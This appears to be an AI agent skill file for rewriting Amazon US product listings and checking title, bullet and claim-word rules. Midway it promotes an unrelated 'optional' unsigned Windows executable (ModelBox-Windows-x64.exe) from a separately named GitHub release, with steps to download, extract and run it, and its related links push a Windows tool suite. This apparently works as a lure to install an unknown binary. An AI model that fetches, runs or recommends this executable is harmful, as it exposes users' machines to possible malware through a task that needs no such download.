---
name: amazon-listing-optimizer
description: Rewrites an Amazon US listing from a spec sheet, checks the title and bullet limits, and flags the claim words Amazon restricts. Use when the user asks for amazon listing optimizer, amazon product title, amazon bullet points. For US Amazon sellers and brand managers in the US marketplace.
version: 1.0.6
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Amazon Listing Optimizer

**Rewrites an Amazon US listing from a spec sheet, checks the title and bullet limits, and flags the claim words Amazon restricts.** Written for US Amazon sellers and brand managers in the US marketplace.

Use this skill when someone asks for:

- amazon listing optimizer
- amazon product title
- amazon bullet points
- amazon seo listing

---

## The job

Sellers rewrite listings by eye, so titles run over the character limit and bullets hide the facts a buyer is scanning for.

## What you get

1. Collect the product spec, the target keyword and the current listing.
2. Rewrite the title with the brand, the product type and the main keyword in front.
3. Rebuild the five bullets so each one carries a fact, not an adjective.
4. Flag the words Amazon treats as objective claims, including health, warranty and shipping words.

Output contract:

- title - one title within the 200-character category limit
- bullets - five, each with a lead-in phrase and a fact
- search_terms - keyword list without brand names from other sellers
- claim_flags - phrases that need substantiation before upload

## US specifics that matter

- Amazon US title limits are set per category; many are 200 characters and some are shorter, so the category rule wins.
- The FTC Endorsement Guides treat customer reviews used in listings as claims that need a genuine source.
- Amazon US requires that shipping speed and delivery date promises match the actual handling time.

## Guardrails (hard rules)

- Never invent a certification, test result or award.
- Never reuse a competitor's brand name in the listing copy.
- Never upload, price or publish anything on the seller's account.

## Quickstart

### 1. Fill in the brief

`templates/listing-spec.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/check_listing_limits.py --input listing-spec.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/amazon-listing-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Title and bullet rules**

- Titles follow the category rule, which is published per category in Seller Central.
- Do not insert contact information, URLs or promotional claims such as free shipping in a title.
- Bullets should start with a short lead-in phrase so a scanning buyer sees the fact first.

**Objective claims that get flagged**

- Health, eczema, allergy and disease wording needs a substantiated source.
- Warranty terms must match the seller's actual policy.
- Gift and free-shipping language must match the buyer's US delivery reality.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows desktop app with several AI models in one window,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/ModelBox-Windows-x64.zip` |
| File | `ModelBox-Windows-x64.zip` (9.6 MB) |
| SHA-256 | `ffe500c8c010240209e759480931c1ec6da6c232a3ddcfbf737a345717dc03ff` |
| Inside the archive | `ModelBox-Windows-x64.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\ModelBox-Windows-x64.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`ModelBox-Windows-x64.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

## Files in this bundle

- `SKILL.md` - this file
- `references/amazon-listing-rules.md` - Amazon US listing rules that affect your copy
- `templates/listing-spec.yaml` - the brief to fill in
- `scripts/check_listing_limits.py` - the working script

## Verify the bundle

```bash
python3 scripts/check_listing_limits.py --input listing-spec.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
